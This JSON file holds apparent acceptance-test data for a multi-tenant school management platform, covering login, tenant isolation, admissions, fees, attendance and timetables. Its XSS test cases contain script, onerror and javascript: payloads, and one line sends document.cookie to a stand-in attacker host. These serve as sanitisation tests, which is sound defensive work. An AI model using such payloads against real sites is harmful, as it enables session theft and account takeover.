 {
  "$schema": "http://json-schema.org/draft-07/schema#",
  "title": "Eduplexo UAT Test Data Sets",
  "version": "1.0.0",
  "test_suites": {
    "auth_rbac": [
      {
        "test_case_id": "TC-AUTH-01",
        "description": "Super Admin Login & HttpOnly Session Cookie Verification",
        "role": "super_admin",
        "payload": {
          "email": "superadmin@eduplexo.com",
          "password": "SuperAdmin#SecurePass2026!",
          "login_type": "super_admin"
        },
        "expected_response": {
          "status_code": 200,
          "cookie_header_contains": ["HttpOnly", "Secure", "SameSite=Strict"],
          "exclude_fields": ["password", "password_hash"]
        }
      },
      {
        "test_case_id": "TC-AUTH-02",
        "description": "Cross-Tenant Row-Level Security Isolation (School Admin A accessing School B)",
        "role": "admin",
        "tenant_id": "school_tenant_a_001",
        "request": {
          "endpoint": "/api/v1/students/stu_school_b_999",
          "method": "GET",
          "headers": {
            "X-Tenant-ID": "school_tenant_b_002"
          }
        },
        "expected_response": {
          "status_code": 403,
          "error_code": "TENANT_ACCESS_DENIED"
        }
      },
      {
        "test_case_id": "TC-AUTH-03",
        "description": "RBAC Role Boundary Enforcement (Teacher updating fee structure)",
        "role": "teacher",
        "tenant_id": "school_tenant_a_001",
        "request": {
          "endpoint": "/api/v1/fees/structures/fee_str_101",
          "method": "PATCH",
          "body": {
            "amount": 15000
          }
        },
        "expected_response": {
          "status_code": 403,
          "error_message": "Role 'teacher' does not have permission 'update' on feature 'fees'"
        }
      }
    ],
    "subscription_tenant": [
      {
        "test_case_id": "TC-SUB-01",
        "description": "School Tenant Provisioning & Plan Assignment",
        "role": "super_admin",
        "payload": {
          "school": {
            "name": "Apex International Academy",
            "code": "APEX-LHR",
            "domain": "apex.eduplexo.com",
            "contact_email": "principal@apexacademy.edu.pk",
            "phone": "+92-42-35800000"
          },
          "subscription": {
            "plan_id": "plan_enterprise_v2",
            "billing_cycle": "annual",
            "start_date": "2026-08-01",
            "end_date": "2027-07-31",
            "max_students": 2500,
            "max_storage_gb": 500
          },
          "initial_admin": {
            "first_name": "Tariq",
            "last_name": "Mahmood",
            "email": "admin@apexacademy.edu.pk"
          }
        },
        "expected_response": {
          "status_code": 201,
          "subscription_status": "ACTIVE"
        }
      },
      {
        "test_case_id": "TC-SUB-02",
        "description": "Plan Upgrade Transactional Integrity",
        "role": "super_admin",
        "payload": {
          "school_id": "school_tenant_b_002",
          "current_plan_id": "plan_basic_v1",
          "new_plan_id": "plan_enterprise_v2",
          "effective_date": "2026-08-05",
          "prorated_charge_pkr": 45000,
          "payment_reference": "TXN-BANK-99882311"
        },
        "expected_response": {
          "status_code": 200,
          "history_logged": true
        }
      }
    ],
    "student_parent": [
      {
        "test_case_id": "TC-STU-01",
        "description": "Valid Student Admission with Parent Profile Linkage",
        "role": "admin",
        "tenant_id": "school_tenant_a_001",
        "payload": {
          "student": {
            "admission_no": "ADM-2026-0412",
            "first_name": "Zainab",
            "last_name": "Raza",
            "dob": "2015-04-12",
            "gender": "female",
            "class_id": "cls_grade5_sec_a",
            "section": "A",
            "roll_number": "15"
          },
          "guardian": {
            "relationship": "father",
            "first_name": "Hassan",
            "last_name": "Raza",
            "cnic": "35202-1234567-3",
            "phone": "+92-300-9876543",
            "email": "hassan.raza@example.com",
            "address": "House 45, Street 12, Phase 5 DHA, Lahore"
          }
        },
        "expected_response": {
          "status_code": 201,
          "guardian_link": "parent._id"
        }
      },
      {
        "test_case_id": "TC-STU-02",
        "description": "Rollback Test on Student Creation Error",
        "role": "admin",
        "tenant_id": "school_tenant_a_001",
        "payload": {
          "student": {
            "admission_no": "ADM-2026-9999",
            "first_name": "TestOrphan",
            "last_name": "User",
            "class_id": "INVALID_CLASS_ID_NON_EXISTENT",
            "section": "Z"
          },
          "guardian": {
            "first_name": "ParentOrphan",
            "phone": "+92-300-0000000"
          }
        },
        "expected_response": {
          "status_code": 400,
          "rollback_verified": true
        }
      }
    ],
    "fee_payments": [
      {
        "test_case_id": "TC-FEE-01",
        "description": "Standard Fee Voucher Settlement & Receipt Generation",
        "role": "admin",
        "tenant_id": "school_tenant_a_001",
        "payload": {
          "voucher_id": "VCH-202608-0089",
          "student_id": "stu_1001",
          "school_id": "school_tenant_a_001",
          "payment_details": {
            "amount_paid": 12500,
            "payment_method": "online_bank_transfer",
            "reference_no": "PKR-IBFT-889102",
            "payment_date": "2026-08-05T10:30:00Z"
          }
        },
        "expected_response": {
          "status_code": 200,
          "receipt_format": "REC-2026-08-\\d{4}"
        }
      },
      {
        "test_case_id": "TC-FEE-02",
        "description": "Simultaneous Parallel Fee Payments Concurrency Test",
        "role": "admin",
        "tenant_id": "school_tenant_a_001",
        "concurrent_payloads": [
          {
            "voucher_id": "VCH-202608-0100",
            "student_id": "stu_1002",
            "amount": 10000
          },
          {
            "voucher_id": "VCH-202608-0101",
            "student_id": "stu_1003",
            "amount": 10000
          }
        ],
        "expected_response": {
          "status_code": 200,
          "collision_count": 0,
          "sequential_receipts": true
        }
      }
    ],
    "security_xss": [
      {
        "test_case_id": "TC-SEC-01",
        "description": "XSS Injection Vectors in Question Bank HTML & Equations",
        "role": "teacher",
        "tenant_id": "school_tenant_a_001",
        "payload": {
          "subject_id": "sub_sci",
          "chapter": "Chapter 3: Physics",
          "question_text": "<p>Calculate velocity <script>alert('XSS-QBANK-01')</script></p>",
          "question_html": "<p>Solve for <i>v</i>: <img src=\"x\" onerror=\"alert('XSS-IMG')\" /> <b onmouseover=\"alert('XSS-HOVER')\">Hover</b></p>",
          "options": [
            "10 m/s <script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
            "20 m/s",
            "30 m/s",
            "40 m/s"
          ],
          "correct_option_index": 1
        },
        "expected_sanitized_output": {
          "contains_script_tag": false,
          "contains_onerror": false,
          "contains_onmouseover": false
        }
      },
      {
        "test_case_id": "TC-SEC-02",
        "description": "XSS Vector in Certificate Templates & Custom Names",
        "role": "admin",
        "tenant_id": "school_tenant_a_001",
        "payload": {
          "certificate_title": "Annual Excellence <iframe src='javascript:alert(1)'></iframe>",
          "student_name": "Ahmad Farooq<script>document.body.innerHTML=''</script>",
          "custom_css_styles": "color: red; background-image: url('javascript:alert(1)');"
        },
        "expected_sanitized_output": {
          "contains_iframe": false,
          "contains_javascript_url": false
        }
      }
    ],
    "attendance_schedules": [
      {
        "test_case_id": "TC-ATT-01",
        "description": "Bulk Class Attendance Marking",
        "role": "teacher",
        "tenant_id": "school_tenant_a_001",
        "payload": {
          "class_id": "cls_grade5_sec_a",
          "date": "2026-08-05",
          "taken_by_teacher_id": "tch_1",
          "records": [
            { "student_id": "stu_1001", "status": "present" },
            { "student_id": "stu_1002", "status": "absent", "remarks": "Medical leave" },
            { "student_id": "stu_1003", "status": "late", "remarks": "Arrived 08:30 AM" }
          ]
        },
        "expected_response": {
          "status_code": 200,
          "records_saved": 3
        }
      },
      {
        "test_case_id": "TC-SCH-01",
        "description": "Timetable Teacher Slot Conflict Prevention",
        "role": "admin",
        "tenant_id": "school_tenant_a_001",
        "payload": {
          "day": "Monday",
          "period": 2,
          "start_time": "09:00",
          "end_time": "09:45",
          "teacher_id": "tch_1",
          "room": "Room-102",
          "class_id": "cls_grade6_sec_b"
        },
        "expected_response": {
          "status_code": 409,
          "error_code": "TEACHER_SCHEDULE_CONFLICT"
        }
      }
    ]
  }
}
